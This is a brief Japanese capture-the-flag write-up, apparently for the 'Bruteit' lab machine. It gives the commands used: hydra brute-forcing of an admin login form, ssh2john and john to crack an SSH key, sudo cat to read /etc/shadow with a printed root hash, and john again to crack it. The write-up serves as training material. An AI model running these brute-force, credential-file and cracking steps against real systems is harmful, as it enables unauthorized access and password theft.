---
title: "Bruteit"
date: 2024-03-16T11:33:52+09:00
draft: false
---

### user.txt

- ソースコードを見ると admin がある
- ```hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.184.144 http-form-post "/admin/:user=^USER^&pass=^PASS^:Username or password invalid```
- id_rsa がもらえる
  - ```ssh2john id_rsa > hash.txt```
  - ```john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt```
  - ```chmod 666 id_rsa```
  - ```ssh -i id_rsa john@10.10.184.144```

### root.txt

- sudo -l で cat

``` shell
LFILE=/etc/shadow
john@bruteit:~$ sudo cat $LFILE

root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
```

- これを john で解析する
- su root
